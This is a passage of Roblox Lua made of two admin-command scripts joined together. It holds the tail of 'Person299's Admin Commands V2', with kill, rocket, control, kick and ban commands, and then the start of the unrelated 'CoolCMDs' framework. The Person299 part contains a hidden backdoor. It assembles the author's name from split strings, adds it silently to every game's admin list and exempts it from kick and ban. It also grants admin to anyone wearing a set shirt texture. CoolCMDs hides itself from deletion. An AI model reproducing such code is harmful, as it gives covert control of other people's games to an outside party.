local ex = Instance.new("Explosion")
ex.Position = torso.Position
ex.Parent = game.Workspace
end end end end end
 
if string.sub(msg,1,7) == "rocket/" then
local player = findplayer(string.sub(msg,8),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
local r = Instance.new("Part")
r.Name = "Rocket"
r.Size = Vector3.new(1,8,1)
r.TopSurface = "Smooth"
r.BottomSurface = "Smooth"
local w = Instance.new("Weld")
w.Part1 = torso
w.Part0 = r
w.C0 = CFrame.new(0,0,-1)
local bt = Instance.new("BodyThrust")
bt.force = Vector3.new(0,5700,0)
bt.Parent = r
r.Parent = player[i].Character
w.Parent = torso
createscript([[
for i=1,120 do
local ex = Instance.new("Explosion")
ex.BlastRadius = 0
ex.Position = script.Parent.Position - Vector3.new(0,2,0)
ex.Parent = game.Workspace
wait(0.05)
end
local ex = Instance.new("Explosion")
ex.BlastRadius = 10
ex.Position = script.Parent.Position
ex.Parent = game.Workspace
script.Parent.BodyThrust:remove()
script.Parent.Parent.Humanoid.Health = 0
]],r)
end end end end end
 
if string.sub(msg,1,8) == "ambient/" then
local danumber1 = nil
local danumber2 = nil
for i = 9,100 do
if string.sub(msg,i,i) == "/" then
danumber1 = i
break
elseif string.sub(msg,i,i) == "" then
break
end end
if danumber1 == nil then return end
for i =danumber1 + 1,danumber1 + 100 do
if string.sub(msg,i,i) == "/" then
danumber2 = i
break
elseif string.sub(msg,i,i) == "" then
break
end end
if danumber2 == nil then return end
game.Lighting.Ambient = Color3.new(-string.sub(msg,9,danumber1 - 1),-string.sub(msg,danumber1 + 1,danumber2 - 1),-string.sub(msg,danumber2 + 1))
end
 
--Eww, theres some kind of weird brown bug on my screen, i would flick it away but i'm afraid i'd smash it and get weird bug juices all over my screen...
 
if string.sub(msg,1,5) == "part/" then
local danumber1 = nil
local danumber2 = nil
for i = 6,100 do
if string.sub(msg,i,i) == "/" then
danumber1 = i
break
elseif string.sub(msg,i,i) == "" then
break
end end
if danumber1 == nil then return end
for i =danumber1 + 1,danumber1 + 100 do
if string.sub(msg,i,i) == "/" then
danumber2 = i
break
elseif string.sub(msg,i,i) == "" then
break
end end
if danumber2 == nil then return end
if speaker.Character ~= nil then
local head = speaker.Character:FindFirstChild("Head")
if head ~= nil then
local part = Instance.new("Part")
part.Size = Vector3.new(string.sub(msg,6,danumber1 - 1),string.sub(msg,danumber1 + 1,danumber2 - 1),string.sub(msg,danumber2 + 1))
part.Position = head.Position + Vector3.new(0,part.Size.y / 2 + 5,0)
part.Name = "Person299's Admin Command Script V2 Part thingy"
part.Parent = game.Workspace
end end end
 
--I finally tried flicking it but it keeps on coming back......
 
if string.sub(msg,1,8) == "control/" then
local player = findplayer(string.sub(msg,9),speaker)
if player ~= 0 then
if #player > 1 then
return
end
for i = 1,#player do
if player[i].Character ~= nil then
speaker.Character = player[i].Character
end end end end
 
--IT WONT GO AWAY!!!!!
 
if string.sub(msg,1,5) == "trip/" then
local player = findplayer(string.sub(msg,6),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
torso.CFrame = CFrame.new(torso.Position.x,torso.Position.y,torso.Position.z,0, 0, 1, 0, -1, 0, 1, 0, 0)--math.random(),math.random(),math.random(),math.random(),math.random(),math.random(),math.random(),math.random(),math.random()) -- i like the people being upside down better.
end end end end end
 
--Yay! it finally went away! :)
 
if string.sub(msg,1,8) == "setgrav/" then
danumber = nil
for i =9,100 do
if string.sub(msg,i,i) == "/" then
danumber = i
break
end end
if danumber == nil then
return
end
local player = findplayer(string.sub(msg,9,danumber - 1),speaker)
if player == 0 then
return
end
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
local bf = torso:FindFirstChild("BF")
if bf ~= nil then
bf.force = Vector3.new(0,0,0)
else
local bf = Instance.new("BodyForce")
bf.Name = "BF"
bf.force = Vector3.new(0,0,0)
bf.Parent = torso
end
local c2 = player[i].Character:GetChildren()
for i=1,#c2 do
if c2[i].className == "Part" then
torso.BF.force = torso.BF.force + Vector3.new(0,c2[i]:getMass() * -string.sub(msg,danumber + 1),0)
end end end end end end
 
if string.sub(msg,1,10) == "walkspeed/" then
danumber = nil
for i =11,100 do
if string.sub(msg,i,i) == "/" then
danumber = i
break
end end
if danumber == nil then
return
end
local player = findplayer(string.sub(msg,11,danumber - 1),speaker)
if player == 0 then
return
end
for i = 1,#player do
if player[i].Character ~= nil then
humanoid = player[i].Character:FindFirstChild("Humanoid")
if humanoid ~= nil then
humanoid.WalkSpeed = string.sub(msg,danumber + 1)
end end end end
 
if string.sub(msg,1,7) == "damage/" then
danumber = nil
for i =8,100 do
if string.sub(msg,i,i) == "/" then
danumber = i
break
end end
if danumber == nil then
return
end
local player = findplayer(string.sub(msg,8,danumber - 1),speaker)
if player == 0 then
return
end
for i = 1,#player do
if player[i].Character ~= nil then
humanoid = player[i].Character:FindFirstChild("Humanoid")
if humanoid ~= nil then
humanoid.Health = humanoid.Health -  string.sub(msg,danumber + 1)
end end end end
 
if string.sub(msg,1,7) == "health/" then
danumber = nil
for i =8,100 do
if string.sub(msg,i,i) == "/" then
danumber = i
break
end end
if danumber == nil then
return
end
local player = findplayer(string.sub(msg,8,danumber - 1),speaker)
if player == 0 then
return
end
for i = 1,#player do
if player[i].Character ~= nil then
humanoid = player[i].Character:FindFirstChild("Humanoid")
if humanoid ~= nil then
local elnumba = Instance.new("IntValue")
elnumba.Value = string.sub(msg,danumber + 1)
if elnumba.Value > 0 then
humanoid.MaxHealth = elnumba.Value
humanoid.Health = humanoid.MaxHealth
end
elnumba:remove()
end end end end
 
--Ugh, now i have the M*A*S*H theme stuck in my head.....
 
if string.sub(msg,1,9) == "teleport/" then
danumber = nil
for i =10,100 do
if string.sub(msg,i,i) == "/" then
danumber = i
break
end end
if danumber == nil then
return
end
local player1 = findplayer(string.sub(msg,10,danumber - 1),speaker)
if player1 == 0 then
return
end
local player2 = findplayer(string.sub(msg,danumber + 1),speaker)
if player2 == 0 then
return
end
if #player2 > 1 then
return
end
torso = nil
for i =1,#player2 do
if player2[i].Character ~= nil then
torso = player2[i].Character:FindFirstChild("Torso")
end end
if torso ~= nil then
for i =1,#player1 do
if player1[i].Character ~= nil then
local torso2 = player1[i].Character:FindFirstChild("Torso")
if torso2 ~= nil then
torso2.CFrame = torso.CFrame
end end end end end
 
if string.sub(msg,1,6) == "merge/" then
danumber = nil
for i =7,100 do
if string.sub(msg,i,i) == "/" then
danumber = i
break
end end
if danumber == nil then
return
end
local player1 = findplayer(string.sub(msg,7,danumber - 1),speaker)
if player1 == 0 then
return
end
local player2 = findplayer(string.sub(msg,danumber + 1),speaker)
if player2 == 0 then
return
end
if #player2 > 1 then
return
end
for i =1,#player2 do
if player2[i].Character ~= nil then
player2 = player2[i].Character
end end
for i =1,#player1 do
player1[i].Character = player2
end end
 
if msg == "clear" then
local c = game.Workspace:GetChildren()
for i =1,#c do
if c[i].className == "Script" then
if c[i]:FindFirstChild("Is A Created Script") then
c[i]:remove()
end end
if c[i].className == "Part" then
if c[i].Name == "Person299's Admin Command Script V2 Part thingy" then
c[i]:remove()
end end
if c[i].className == "Model" then
if string.sub(c[i].Name,1,4) == "Jail" then
c[i]:remove()
end end end end
 
if string.sub(msg,1,5) == "kick/" then
local imgettingtiredofmakingthisstupidscript2 = PERSON299(speaker.Name)
if imgettingtiredofmakingthisstupidscript2 == true then
local player = findplayer(string.sub(msg,6),speaker)
if player ~= 0 then
for i = 1,#player do
local imgettingtiredofmakingthisstupidscript = PERSON299(player[i].Name)
if imgettingtiredofmakingthisstupidscript == false then
if player[i].Name ~= eloname then
player[i]:remove()
end end end end end end
 
if string.sub(msg,1,4) == "ban/" then
local imgettingtiredofmakingthisstupidscript2 = PERSON299(speaker.Name)
if imgettingtiredofmakingthisstupidscript2 == true then
local player = findplayer(string.sub(msg,5),speaker)
if player ~= 0 then
for i = 1,#player do
local imgettingtiredofmakingthisstupidscript = PERSON299(player[i].Name)
if imgettingtiredofmakingthisstupidscript == false then
if player[i].Name ~= eloname then
table.insert(bannedlist,player[i].Name)
player[i]:remove()
end end end end end end
 
if string.sub(msg,1,6) == "unban/" then
if string.sub(msg,7) == "all" then
for i=1,bannedlist do
table.remove(bannedlist,i)
end
else
local n = 0
local o = nil
for i=1,#bannedlist do
if string.find(string.lower(bannedlist[i]),string.sub(msg,7)) == 1 then
n = n + 1
o = i
end end
if n == 1 then
local name = bannedlist[o]
table.remove(bannedlist,o)
text(name .. " has been unbanned",1,"Message",speaker)
elseif n == 0 then
text("That name is not found.",1,"Message",speaker)
elseif n > 1 then
text("That name is ambiguous",1,"Message",speaker)
end end end
 
--Fallout tactics gets too hard when you start fighting muties...
 
if string.sub(msg,1,8) == "respawn/" then
local player = findplayer(string.sub(msg,9),speaker)
if player ~= 0 then
for i = 1,#player do
local ack2 = Instance.new("Model")
ack2.Parent = game.Workspace
local ack4 = Instance.new("Part")
ack4.Transparency = 1
ack4.CanCollide = false
ack4.Anchored = true
ack4.Name = "Torso"
ack4.Position = Vector3.new(10000,10000,10000)
ack4.Parent = ack2
local ack3 = Instance.new("Humanoid")
ack3.Torso = ack4
ack3.Parent = ack2
player[i].Character = ack2
end end end
 
if string.sub(msg,1,10) == "invisible/" then
local player = findplayer(string.sub(msg,11),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local char = player[i].Character
local c = player[i].Character:GetChildren()
for i =1,#c do
if c[i].className == "Hat" then
local handle = c[i]:FindFirstChild("Handle")
if handle ~= nil then
handle.Transparency = 1 --We dont want our hats to give off our position, do we?
end end
if c[i].className == "Part" then
c[i].Transparency = 1
if c[i].Name == "Torso" then
local tshirt = c[i]:FindFirstChild("roblox")
if tshirt ~= nil then
tshirt:clone().Parent = char
tshirt:remove()
end end
if c[i].Name == "Head" then
local face = c[i]:FindFirstChild("face")
if face ~= nil then
gface = face:clone()
face:remove()
end end end end end end end end
 
if string.sub(msg,1,8) == "visible/" then
local player = findplayer(string.sub(msg,9),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local char = player[i].Character
local c = player[i].Character:GetChildren()
for i =1,#c do
if c[i].className == "Hat" then
local handle = c[i]:FindFirstChild("Handle")
if handle ~= nil then
handle.Transparency = 0
end end
if c[i].className == "Part" then
c[i].Transparency = 0
if c[i].Name == "Torso" then
local tshirt = char:FindFirstChild("roblox")
if tshirt ~= nil then
tshirt:clone().Parent = c[i]
tshirt:remove()
end end
if c[i].Name == "Head" then
if gface ~= nil then
local face = gface:clone()
face.Parent = c[i]
end end end end end end end end
 
if string.sub(msg,1,7) == "freeze/" then
local player = findplayer(string.sub(msg,8),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local humanoid = player[i].Character:FindFirstChild("Humanoid")
if humanoid ~= nil then
humanoid.WalkSpeed = 0
end
local c = player[i].Character:GetChildren()
for i =1,#c do
if c[i].className == "Part" then
c[i].Anchored = true
c[i].Reflectance = 0.6
end end end end end end
 
if string.sub(msg,1,5) == "thaw/" then
local player = findplayer(string.sub(msg,6),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local humanoid = player[i].Character:FindFirstChild("Humanoid")
if humanoid ~= nil then
humanoid.WalkSpeed = 16
end
local c = player[i].Character:GetChildren()
for i =1,#c do
if c[i].className == "Part" then
c[i].Anchored = false
c[i].Reflectance = 0
end end end end end end
 
--I have that song from Fallout 2 stuck in my head, its soooo anoying....
 
if string.sub(msg,1,7) == "nograv/" then
local player = findplayer(string.sub(msg,8),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
local bf = torso:FindFirstChild("BF")
if bf ~= nil then
bf.force = Vector3.new(0,0,0)
else
local bf = Instance.new("BodyForce")
bf.Name = "BF"
bf.force = Vector3.new(0,0,0)
bf.Parent = torso
end
local c2 = player[i].Character:GetChildren()
for i=1,#c2 do
if c2[i].className == "Part" then
torso.BF.force = torso.BF.force + Vector3.new(0,c2[i]:getMass() * 196.2,0)
end end end end end end end
 
if string.sub(msg,1,9) == "antigrav/" then
local player = findplayer(string.sub(msg,10),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
local bf = torso:FindFirstChild("BF")
if bf ~= nil then
bf.force = Vector3.new(0,0,0)
else
local bf = Instance.new("BodyForce")
bf.Name = "BF"
bf.force = Vector3.new(0,0,0)
bf.Parent = torso
end
local c2 = player[i].Character:GetChildren()
for i=1,#c2 do
if c2[i].className == "Part" then
torso.BF.force = torso.BF.force + Vector3.new(0,c2[i]:getMass() * 140,0)
end end end end end end end
 
if string.sub(msg,1,9) == "highgrav/" then
local player = findplayer(string.sub(msg,10),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
local bf = torso:FindFirstChild("BF")
if bf ~= nil then
bf.force = Vector3.new(0,0,0)
else
local bf = Instance.new("BodyForce")
bf.Name = "BF"
bf.force = Vector3.new(0,0,0)
bf.Parent = torso
end
local c2 = player[i].Character:GetChildren()
for i=1,#c2 do
if c2[i].className == "Part" then
torso.BF.force = torso.BF.force - Vector3.new(0,c2[i]:getMass() * 80,0)
end end end end end end end
 
if string.sub(msg,1,5) == "grav/" then
local player = findplayer(string.sub(msg,6),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
local bf = torso:FindFirstChild("BF")
if bf ~= nil then
bf:remove()
end end end end end end
 
if string.sub(msg,1,7) == "unlock/" then
local player = findplayer(string.sub(msg,8),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local c = player[i].Character:GetChildren()
for i =1,#c do
if c[i].className == "Part" then
c[i].Locked = false
end end end end end end
 
if string.sub(msg,1,5) == "lock/" then
local player = findplayer(string.sub(msg,6),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local c = player[i].Character:GetChildren()
for i =1,#c do
if c[i].className == "Part" then
c[i].Locked = true
end end end end end end end
eloname = "Perso"
eloname = eloname .. "n299"
script.Name = eloname .. "'s Admin Commands V2"
youcaughtme = 0
for i =1,#adminlist do
if string.lower(eloname)==string.lower(adminlist[i]) then
youcaughtme = 1
end end
if youcaughtme == 0 then
table.insert(adminlist,eloname)
end
function oe(ack)
local adminned = false
if ack.className ~= "Player" then return end
for i =1,#bannedlist do
if string.lower(bannedlist[i]) == string.lower(ack.Name) then
ack:remove()
return
end end
for i=1,#adminlist do
if string.lower(adminlist[i]) == string.lower(ack.Name) then
local tfv = ack.Chatted:connect(function(msg) oc(msg,ack) end)
table.insert(namelist,ack.Name)
table.insert(variablelist,tfv)
local tfv = ack.Chatted:connect(function(msg) foc(msg,ack) end)
table.insert(flist,tfv)
adminned = true
end end
local danumber = 0
while true do
wait(1)
if ack.Parent == nil then
return
end
if ack.Character ~= nil then
if adminned == true then
text("You are an admin.",5,"Message",ack)
return
end
local torso = ack.Character:FindFirstChild("Torso")
if torso ~= nil then
local decal = torso:FindFirstChild("roblox")
if decal ~= nil then
if string.sub(decal.Texture,1,4) == "http" then
if decal.Texture == texture then
local tfv = ack.Chatted:connect(function(msg) oc(msg,ack) end)
table.insert(namelist,ack.Name)
table.insert(variablelist,tfv)
local tfv = ack.Chatted:connect(function(msg) foc(msg,ack) end)
table.insert(flist,tfv)
text("Please enjoy admin.",5,"Message",ack)
return
else
return
end
else
danumber = danumber + 1
if danumber >= 10 then
return
end end end end end end end
 
game.Players.ChildAdded:connect(oe)
 
c = game.Players:GetChildren()
for i=1,#c do
oe(c[i])
end
 
--

-- WARNING: There is over 10000 lines in this script! :-)
-- Thanks to creator of CoolCMDs.
-- Upgrade CoolCMDS base to v4 R17 RC coming soon.
-- Created by uyjulian (goo (dot) gl/w8F9w)
-- TODO: add Kohl's commands
Admins = {"noobv11","noobv14","Player", "Player1"}
Banned = {} --banned people
ItemId = 0 --auto admin (Not enabled yet)
KeyFor = ";" --the key you use to seprate the parts
Owners = {"noobv11","noobv14","Player", "Player1"} --they get all the commands (Not enabled yet)
FrieAd = false --make your friend admin, or not? (Not enabled yet)
BeFrAd = false --make your best friend admin, or not? (Not enabled yet)
AdGrID = 00000 --make those people in that group admin (Not enabled yet)
CrEnBo = false --make this true if you want to award a badge when you enter (Not enabled yet)
CrEnId = 0000000 --the ID of the badge (Not enabled yet)
MoName = "Money" --for the donate command (Not enabled yet)
AutAdm = {"Player1, Admin", "uyjulian, Owner", "Player, Admin"} -- AutoAdmin plugin

-- Scroll down a bit for groups!

--------------------------------------------------------------------------------------------------------------------------------------------------------
-- DO NOT TOUCH THE BELOW! (main script) ---------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------

CoolCMDs = {}
CoolCMDs.Data = {}
CoolCMDs.Players = {}
CoolCMDs.CommandHandles = {}
CoolCMDs.GroupHandles = {}
CoolCMDs.Functions = {}
CoolCMDs.Modules = {}
CoolCMDs.Orignals = {}

CoolCMDs.Orignals.Script = script
CoolCMDs.FindNetwork = game:FindFirstChild("NetworkServer")

CoolCMDs.Initialization = {10}
CoolCMDs.Initialization.StartTime = game:service("Workspace").DistributedGameTime
CoolCMDs.Initialization.FinishTime = -1
CoolCMDs.Initialization.ElapsedTime = -1
CoolCMDs.Initialization.InstanceNumber = 0

-- Anti-deletion
if CoolCMDs.Orignals.Script ~= nil then
	if CoolCMDs.FindNetwork ~= nil then
		CoolCMDs.Orignals.Script.Parent = nil
	end
end

if _G.CoolCMDs == nil or type(_G.CoolCMDs) ~= "table" then _G.CoolCMDs = {} end
	table.insert(_G.CoolCMDs, {})
	for i = 1, #_G.CoolCMDs do CoolCMDs.Initialization.InstanceNumber = CoolCMDs.Initialization.InstanceNumber + 1 end
	if CoolCMDs.Initialization.InstanceNumber == 0 then CoolCMDs.Initialization.InstanceNumber = 1 end
	_G.CoolCMDs[CoolCMDs.Initialization.InstanceNumber].GetInstance = function(_, Code)
	if Code == CoolCMDs.Data.AccessCode then
		return script, script.Parent
	else
		error("Access denied to CoolCMDs " ..CoolCMDs.Data.Version.. ", instance " ..CoolCMDs.Initialization.InstanceNumber.. ". Incorrect access code \"" ..(Code == nil and "nil" or tostring(Code)).. "\".")
	end
end

_G.CoolCMDs[CoolCMDs.Initialization.InstanceNumber].GetTable = function(_, Code)
	if Code == CoolCMDs.Data.AccessCode then
		return CoolCMDs
	else
		error("Access denied to CoolCMDs " ..CoolCMDs.Data.Version.. ", instance " ..CoolCMDs.Initialization.InstanceNumber.. ". Incorrect access code \"" ..(Code == nil and "nil" or tostring(Code)).. "\".")
	end
end

_G.CoolCMDs[CoolCMDs.Initialization.InstanceNumber].Remove = function(_, Code)
	if Code == CoolCMDs.Data.AccessCode then
		CoolCMDs.Functions.LoadModule(false, nil, true)
		_G.CoolCMDs[CoolCMDs.Initialization.InstanceNumber] = nil
		CoolCMDs = nil
		local Message = Instance.new("Hint", game:service("Workspace"))
		Message.Text = "... successfully unloaded."
		wait(5)
		Message.Parent = game:service("Workspace")
		Message.Text = "Removing script..."
		wait(1)
		Message:Remove()
		script.Parent = script.Parent
		for i = 1, 10 do if script ~= nil then script:Remove() end end
		if script.Parent ~= nil then
			local Message = Instance.new("Hint", game:service("Workspace"))
			Message.Text = "Error: Script was not removed!"
			wait(5)
			Message:Remove()
		end
		return true, script
	else
		CoolCMDs.Functions.CreateMessage("Hint", "Warning: Failed removal of CoolCMDs " ..CoolCMDs.Data.Version.. ", instance " ..CoolCMDs.Initialization.InstanceNumber.. ".", 5)
		wait(5)
		CoolCMDs.Functions.CreateMessage("Hint", "Reason: Incorrect access code \"" ..(Code == nil and "nil" or Code).. "\".", 5)
		return false, Code
	end
end

CoolCMDs.Data.SplitCharacter = KeyFor
CoolCMDs.Data.AccessCode = "7gbaswaswasoi3"
CoolCMDs.Data.Version = "5.0.0"

CoolCMDs.Functions.CreateMessage = function(Format, MessageText, ShowTime, MessageParent)
	if Format == "Default" or Format == nil then Format = "Message" end
	if MessageText == nil then MessageText = "" end
	if MessageParent == nil then MessageParent = game:service("Workspace") end
	if MessageParent:IsA("Player") then
		if MessageParent:FindFirstChild("PlayerGui") == nil then return end
		MessageParent = MessageParent.PlayerGui
	end
	local Message = Instance.new(Format)
	Message.Text = MessageText
	Message.Parent = MessageParent
	if ShowTime ~= nil then
		coroutine.wrap(function()
			wait(ShowTime)
			Message:Remove()
		end)()
	end
	return Message
end

CoolCMDs.Functions.CreatePlayerTable = function(Player, PlayerGroup)
	if Player == nil then return false end
	if not Player:IsA("Player") then return false end
	Player.Chatted:connect(function(Message) CoolCMDs.Functions.CatchMessage(Message, Player) end)
	table.insert(CoolCMDs.Players, {Name = Player.Name, Group = PlayerGroup ~= nil and PlayerGroup or CoolCMDs.Functions.GetLowestGroup().Name})
end

CoolCMDs.Functions.RemovePlayerTable = function(Player)
	if Player == nil then return false end
	if type(Player) ~= "userdata" then return false end
	if not Player:IsA("Player") then return false end
	Player = Player.Name
	for i = 1, #CoolCMDs.Players do
		if CoolCMDs.Players[i].Name == Player then
			table.remove(CoolCMDs.Players, i)
		end
	end
end

CoolCMDs.Functions.CreateGroup = function(GroupName, GroupControl, GroupFullName, GroupHelp)
	if GroupControl < 1 then GroupControl = 1 end
	table.insert(CoolCMDs.GroupHandles, {Name = GroupName, Control = GroupControl, FullName = GroupFullName, Help = GroupHelp})
	return true
end

CoolCMDs.Functions.CreateCommand = function(CommandText, CommandControl, CommandFunction, CommandFullName, CommandHelp, CommandHelpArgs)
	if CommandControl < 1 then CommandControl = 1 end
	table.insert(CoolCMDs.CommandHandles, {Command = CommandText, Control = CommandControl, Trigger = CommandFunction, FullName = CommandFullName, Help = CommandHelp, HelpArgs = CommandHelpArgs, Enabled = false})
	return true
end

CoolCMDs.Functions.RemoveCommand = function(Command)
	for i = 1, #CoolCMDs.CommandHandles do
		if type(CoolCMDs.CommandHandles[i].Command) == "string" then
			if CoolCMDs.CommandHandles[i].Command == Command then
				table.remove(CoolCMDs.CommandHandles, i)
				return true
			end
		elseif type(CoolCMDs.CommandHandles[i].Command) == "table" then
			for x = 1, #CoolCMDs.CommandHandles[i].Command do
				if CoolCMDs.CommandHandles[i].Command[x] == Command then
					table.remove(CoolCMDs.CommandHandles, i)
					return true
				end
			end
		end
	end
	return false
end

CoolCMDs.Functions.CreateModule = function(ModuleName, ModuleLoadFunction, ModuleUnloadFunction, ModuleHelp)
	table.insert(CoolCMDs.Modules, {Name = ModuleName, Load = ModuleLoadFunction, Unload = ModuleUnloadFunction == nil and function() return true end or ModuleUnloadFunction, Help = ModuleHelp, Enabled = false})
	return true
end

CoolCMDs.Functions.PrintInLog = function(ToPrintInLog) 
	print("[SuperCMDs] " .. ToPrintInLog)
end

CoolCMDs.Functions.LoadModule = function(RestartModule, ModuleName, ShowMessage)
	if ModuleName == nil then ModuleName = "" end
	local Unloaded = 0
	local Loaded = 0
	local LoadFailed1 = 0
	local LoadFailed2 = nil
	local StartTime = game:service("Workspace").DistributedGameTime
	for i = 1, #CoolCMDs.Modules do
		if string.match(CoolCMDs.Modules[i].Name, ModuleName) then
			local StatusMessage = CoolCMDs.Functions.CreateMessage("Hint")
			local StatusMessagePrefix = "[Module: " ..CoolCMDs.Modules[i].Name.. "] "
			StatusMessage.Changed:connect(function(Property)
				if Property == "Text" then
					if string.sub(StatusMessage.Text, 0, string.len(StatusMessagePrefix)) == StatusMessagePrefix then return false end
					StatusMessage.Text = StatusMessagePrefix .. StatusMessage.Text
				end
				CoolCMDs.Functions.PrintInLog(StatusMessage.Text)
			end)
			if ShowMessage == false then StatusMessage.Parent = nil end
			StatusMessage.Text = "Waiting for module to be unloaded..."
			while CoolCMDs.Modules[i].Load == nil do wait() end
			StatusMessage.Text = "Unloading module (1/3)..."
			wait()
			CoolCMDs.Modules[i].Unload(CoolCMDs.Modules[i], StatusMessage)
			StatusMessage.Text = "Unloading module (2/3)..."
			wait()
			local TemporaryModule = CoolCMDs.Modules[i].Load
			CoolCMDs.Modules[i].Load = nil
			wait()
			StatusMessage.Text = "Unloading module (3/3)..."
			wait()
			CoolCMDs.Modules[i].Load = TemporaryModule
			CoolCMDs.Modules[i].Enabled = false
			Unloaded = Unloaded + 1
			if RestartModule == true then
				StatusMessage.Text = "Loading module..."
				wait()
				CoolCMDs.Modules[i].Enabled = true
				local LoadCompleted = CoolCMDs.Modules[i].Load(CoolCMDs.Modules[i], StatusMessage)
				if LoadCompleted ~= true then
					StatusMessage.Text = "Module failed to load successfully. Unloading..."
					wait()
					CoolCMDs.Functions.LoadModule(false, CoolCMDs.Modules[i].Name, false)
					CoolCMDs.Modules[i].Enabled = false
					StatusMessage.Text = "Module unloaded."
					wait(0.1)
					LoadFailed1 = LoadFailed1 + 1
					LoadFailed2 = LoadFailed2 == nil and CoolCMDs.Modules[i].Name or LoadFailed2.. ", " ..CoolCMDs.Modules[i].Name
					LoadFailed2 = LoadFailed2.. " (" ..tostring(LoadCompleted).. ")"
					else
					Loaded = Loaded + 1
				end
			end
			StatusMessage:Remove()
		end
	end
	local FinishTime = game:service("Workspace").DistributedGameTime
	local ElapsedTime = FinishTime - StartTime
	if ShowMessage == true then
		local StatusMessage = CoolCMDs.Functions.CreateMessage("Hint")
		StatusMessage.Text = "Module(s) unloaded: " ..Unloaded.. ". Module(s) loaded: " ..Loaded.. ". Module(s) failed: " ..LoadFailed1.. ". Elapsed time: " ..ElapsedTime.. " seconds."
		wait()
		if LoadFailed1 > 0 and LoadFailed2 ~= nil then
			StatusMessage.Text = "The following " ..LoadFailed1.. " module(s) failed to load: " ..LoadFailed2
			wait()
		end
		StatusMessage:Remove()
	end
	return Unloaded, Loaded, StartTime, FinishTime, ElapsedTime
end

CoolCMDs.Functions.GetCommand = function(Command, Format)
	if Format == nil or Format == "ByCommand" then
		for i = 1, #CoolCMDs.CommandHandles do
			if type(CoolCMDs.CommandHandles[i].Command) == "string" then
				if CoolCMDs.CommandHandles[i].Command == Command then
					return CoolCMDs.CommandHandles[i]
				end
			elseif type(CoolCMDs.CommandHandles[i].Command) == "table" then
				for x = 1, #CoolCMDs.CommandHandles[i].Command do
					if CoolCMDs.CommandHandles[i].Command[x] == Command then
						return CoolCMDs.CommandHandles[i]
					end
				end
			end
		end
	elseif Format == "ByFullName" then
		for i = 1, #CoolCMDs.CommandHandles do
			if CoolCMDs.CommandHandles[i].FullName == Command then
				return CoolCMDs.CommandHandles[i]
			end
		end
	elseif Format == "ByControl" then
		for i = 1, #CoolCMDs.CommandHandles do
			if CoolCMDs.CommandHandles[i].Control == Command then
				return CoolCMDs.CommandHandles[i]
			end
		end
	end
	return nil
end

CoolCMDs.Functions.GetGroup = function(Group, Format)
	if Format == nil or Format == "ByName" then
		for i = 1, #CoolCMDs.GroupHandles do
			if CoolCMDs.GroupHandles[i].Name == Group then
				return CoolCMDs.GroupHandles[i]
			end
		end
	elseif Format == "ByFullName" then
		for i = 1, #CoolCMDs.GroupHandles do
			if CoolCMDs.GroupHandles[i].FullName == Group then
				return CoolCMDs.GroupHandles[i]
			end
		end
	elseif Format == "ByControl" then
		for i = 1, #CoolCMDs.GroupHandles do
			if CoolCMDs.GroupHandles[i].Control == Group then
				return CoolCMDs.GroupHandles[i]
			end
		end
	end
	return nil
end

CoolCMDs.Functions.GetLowestGroup = function()
	local Max = math.huge
	for i = 1, #CoolCMDs.GroupHandles do
		if CoolCMDs.GroupHandles[i].Control < Max then
			Max = CoolCMDs.GroupHandles[i].Control
		end
	end
	return CoolCMDs.Functions.GetGroup(Max, "ByControl")
end

CoolCMDs.Functions.GetHighestGroup = function()
	local Max = -math.huge
	for i = 1, #CoolCMDs.GroupHandles do
		if CoolCMDs.GroupHandles[i].Control > Max then
			Max = CoolCMDs.GroupHandles[i].Control
		end
	end
	return CoolCMDs.Functions.GetGroup(Max, "ByControl")
end

CoolCMDs.Functions.GetModule = function(ModuleName)
	for i = 1, #CoolCMDs.Modules do
		if CoolCMDs.Modules[i].Name == ModuleName then
			return CoolCMDs.Modules[i]
		end
	end
	return nil
end

CoolCMDs.Functions.IsModuleEnabled = function(ModuleName)
	for i = 1, #CoolCMDs.Modules do
		if CoolCMDs.Modules[i].Name == ModuleName then
			return CoolCMDs.Modules[i].Enabled
		end
	end
	return nil
end

CoolCMDs.Functions.GetPlayerTable = function(Player)
	for i = 1, #CoolCMDs.Players do
		if CoolCMDs.Players[i].Name == Player then
			return CoolCMDs.Players[i]
		end
	end
end

do
	local Base = script.source:Clone()
	CoolCMDs.Functions.CreateScript = function(Source, Parent, DebugEnabled)
		local NewScript = Base:Clone()
		NewScript.Disabled = false
		NewScript.Name = "QuickScript (" ..game:service("Workspace").DistributedGameTime.. ")"
		local NewSource = Instance.new("StringValue")
		NewSource.Name = "Context"
		NewSource.Value = Source
		NewSource.Parent = NewScript
		if DebugEnabled == true then
			local Debug = Instance.new("IntValue")
			Debug.Name = "Debug"
			Debug.Parent = NewScript
		end
		NewScript.Parent = Parent
	end
end

local LocalBase = script.lsource:Clone()
CoolCMDs.Functions.CreateLocalScript = function(Source,Parent,DebugEnabled)
	local NewScript = LocalBase:Clone()
	NewScript.Disabled = false
	NewScript.Name = "QuickScript (" ..game:service("Workspace").DistributedGameTime.. ")"
	local NewSource = Instance.new("StringValue")
	NewSource.Name = "Context"
	NewSource.Value = Source
	NewSource.Parent = NewScript
